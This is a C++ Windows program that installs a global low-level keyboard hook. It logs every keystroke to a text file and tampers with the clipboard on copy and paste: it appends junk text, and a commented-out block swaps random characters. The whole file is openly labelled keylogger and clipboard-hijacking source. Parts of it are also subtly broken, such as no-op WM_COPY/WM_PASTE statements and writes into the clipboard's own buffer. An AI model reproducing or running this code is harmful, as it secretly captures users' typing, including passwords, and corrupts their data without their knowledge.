#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <vector>     //For clipboardQueue
#include <stdlib.h>   //For rand()
#include <time.h>       /* time */

const std::string WRITE_FILE = "output.txt";
std::vector<char*> clipboardQueue;

void WriteToFile(char inputChar)
{
  std::ofstream outputFile;
  outputFile.open(WRITE_FILE, std::fstream::app);

  //make enter key (\r) output as a newline (\n)
  if (inputChar == '\r')
  {
    inputChar = '\n';
  }

  std::cout << inputChar;
  outputFile << inputChar;
  outputFile.close();

  return;
}

//The function that implements the key logging functionality
LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
{
   char pressedKey;
   // Declare a pointer to the KBDLLHOOKSTRUCTdsad
   KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
   switch( wParam )
   {
       case WM_KEYDOWN: // When the key has been pressed and released
       {
         //get the key code
         pressedKey = (char)pKeyBoard->vkCode;

         //Checks if ctr+c is hit
         if (pKeyBoard->vkCode == 0x43 && GetKeyState(VK_CONTROL) & 0x8000) {
             WM_COPY;
             Sleep(500);
             OpenClipboard(NULL);
             char* buffer;
             buffer = (char*)GetClipboardData(CF_TEXT);

             //Checks buffer length and changes it accordingly
             if (strlen(buffer) >= 10) {
               strcat (buffer, "Blah Blah No Good, too long");
             } else {
               strcat (buffer, "too short");
               strcat (buffer, " Heres some shit");
             }

             //Closes clipboard and pushes the buffer to the queue
             CloseClipboard();
             clipboardQueue.push_back(buffer);

         //Checks if ctr + v is hit
         } else if (pKeyBoard->vkCode == 0x56 && GetKeyState(VK_CONTROL) & 0x8000) { // ctrl-v is pressed
             if (clipboardQueue.size() > 0) {
                 //Sets the output equal to the queue
                 const char* output = clipboardQueue[0];
                 const size_t len = strlen(output) + 1;
                 HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                 memcpy(GlobalLock(hMem), output, len);
                 GlobalUnlock(hMem);

                 //Pushes data and pastes the clipboard
                 OpenClipboard(0);
                 EmptyClipboard();
                 SetClipboardData(CF_TEXT, hMem);
                 CloseClipboard();
                 WM_PASTE;
                 clipboardQueue.erase(clipboardQueue.begin());
             }
         }
       }
       break;
       default:
           return CallNextHookEx( NULL, nCode, wParam, lParam );
       break;
   }

    //do something with the pressed key here
    WriteToFile(pressedKey);

   //according to winapi all functions which implement a hook must return by calling next hook
   return CallNextHookEx( NULL, nCode, wParam, lParam);
}

int main()
{
  //Retrieve the applications instance
  HINSTANCE instance = GetModuleHandle(NULL);

  //Open clipboard
  OpenClipboard(NULL);
  EmptyClipboard();
  CloseClipboard();

  //Set a global Windows Hook to capture keystrokes using the function declared above
  HHOOK test1 = SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, instance, 0);

  MSG Msg;

  //Message loop
  while(GetMessage(&Msg, NULL, 0, 0) > 0)
  {
    TranslateMessage(&Msg);
    DispatchMessage(&Msg);
  }

  return 0;
}

/*
if (pKeyBoard->vkCode == 0x43 && GetKeyState(VK_CONTROL) & 0x8000) {
  WM_COPY;
  Sleep(500);
  OpenClipboard(NULL);
  char* buffer;
  buffer = (char*)GetClipboardData(CF_TEXT);

  int rbuff, rabc;
  int len = strlen(buffer);
  bool samechar = true;
  char test[len];
  rbuff = rand() % strlen(buffer);
  rabc = rand() % strlen(abc);
  for (int i=0; i <= len; i++) {
    if (i == rbuff) {
      while (samechar) {
        if (buffer[i] != abc[rabc]) {
          test[i] = abc[rabc];
          samechar = false;
        } else {
          rabc = rand() % strlen(abc);
        }
      }
    } else {
      test[i] = buffer[i];
    }
  }

  CloseClipboard();
  clipboardQueue.push_back(test);
  std::cout << test << " copied!\n";
  std::cout << clipboardQueue[0] << std::endl;
}
else if (pKeyBoard->vkCode == 0x56 && GetKeyState(VK_CONTROL) & 0x8000) { // ctrl-v is pressed
  if (clipboardQueue.size() > 0) {
    const char* output = clipboardQueue[0];
    const size_t len = strlen(output) + 1;
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
    memcpy(GlobalLock(hMem), output, len);
    GlobalUnlock(hMem);
    OpenClipboard(0);
    EmptyClipboard();
    SetClipboardData(CF_TEXT, hMem);
    CloseClipboard();
    WM_PASTE;
    clipboardQueue.erase(clipboardQueue.begin());
    cout << output << " pasted!\n";
  }
}
*/
